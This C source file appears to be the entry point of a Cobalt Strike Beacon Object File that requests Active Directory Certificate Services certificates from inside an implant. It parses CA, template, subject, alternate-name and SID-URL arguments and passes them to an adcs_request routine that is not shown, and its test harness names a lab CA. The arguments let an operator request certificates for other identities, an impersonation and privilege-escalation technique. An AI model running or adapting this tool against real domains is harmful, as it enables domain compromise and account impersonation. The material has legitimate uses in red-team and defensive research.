#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "adcs_request.c"


#ifdef BOF
VOID go(
	IN PCHAR Buffer,
	IN ULONG Length
)
{
	HRESULT hr = S_OK;
	datap parser;
	LPCWSTR lpswzCA = NULL;
	LPCWSTR lpswzTemplate = NULL;
	LPCWSTR lpswzSubject = NULL;
	LPCWSTR lpswzAltName = NULL;
	LPCWSTR lpswzAltUrl = NULL;
	LPCWSTR lpswzPfxPassword = NULL;
	BOOL bInstall = FALSE;
	BOOL bMachine = FALSE;
	BOOL addAppPolicy = FALSE;
	BOOL dns = FALSE;
	BOOL bPem = FALSE;
    
	if (!bofstart())
	{
		return;
	}

	BeaconDataParse(&parser, Buffer, Length);
	lpswzCA = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzTemplate = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzSubject = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzAltName = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzAltUrl = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzPfxPassword = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	bInstall = (BOOL)BeaconDataShort(&parser);
	bMachine = (BOOL)BeaconDataShort(&parser);
	addAppPolicy = (BOOL)BeaconDataShort(&parser);
	dns = (BOOL)BeaconDataShort(&parser);
	bPem = (BOOL)BeaconDataShort(&parser);
	
	internal_printf("\nRequesting a %S certificate from %S for the current user\n", lpswzTemplate, lpswzCA);

	hr = adcs_request(
		lpswzCA, 
		lpswzTemplate,
		lpswzSubject,
		lpswzAltName,
		lpswzAltUrl,
		lpswzPfxPassword,
		bInstall,
		bMachine,
		addAppPolicy,
		dns,
		bPem
	);
	if (S_OK != hr)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed: 0x%08lx\n", hr);
		goto fail;
	}

	internal_printf("\n--- SUCCESS ---\n");

fail:
	printoutput(TRUE);

	bofstop();
};
#else
#define TEST_CA L"Cert.testrange.local\\testrange-CERT-CA"
#define TEST_TEMPLATE L""
#define TEST_SUBJECT L""
#define TEST_ALTNAME L""
#define TEST_ALTURL L""
//#define TEST_ALTURL L"tag:microsoft.com,2022-09-14:sid:S-1-5-21-712980493-1503034693-3565059331-1105"
#define TEST_PFX_PASSWORD L""
#define TEST_INSTALL FALSE
#define TEST_MACHINE FALSE
#define TEST_APPPOLICY FALSE
#define TEST_DNS FALSE
#define TEST_PEM FALSE
int main(int argc, char ** argv)
{
	HRESULT hr = S_OK;
	LPCWSTR lpswzCA = TEST_CA;
	LPCWSTR lpswzTemplate = TEST_TEMPLATE;
	LPCWSTR lpswzSubject = TEST_SUBJECT;
	LPCWSTR lpswzAltName = TEST_ALTNAME;
	LPCWSTR lpswzAltUrl = TEST_ALTURL;
	LPCWSTR lpswzPfxPassword = TEST_PFX_PASSWORD;
	BOOL bInstall = TEST_INSTALL;
	BOOL bMachine = TEST_MACHINE;
	BOOL bAppPolicy = TEST_APPPOLICY;
	BOOL bDNS = TEST_DNS;
	BOOL bPem = TEST_PEM;

	internal_printf("\nRequesting a %S certificate from %S for the current user\n", lpswzTemplate, lpswzCA);

	hr = adcs_request(
		lpswzCA, 
		lpswzTemplate,
		lpswzSubject,
		lpswzAltName,
		lpswzAltUrl,
		lpswzPfxPassword,
		bInstall,
		bMachine,
		bAppPolicy,
		bDNS,
		bPem
	);
	if (S_OK != hr)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed: 0x%08lx\n", hr);
		goto fail;
	}

	internal_printf("\n--- SUCCESS ---\n");

fail:
	return hr;
}
#endif

	




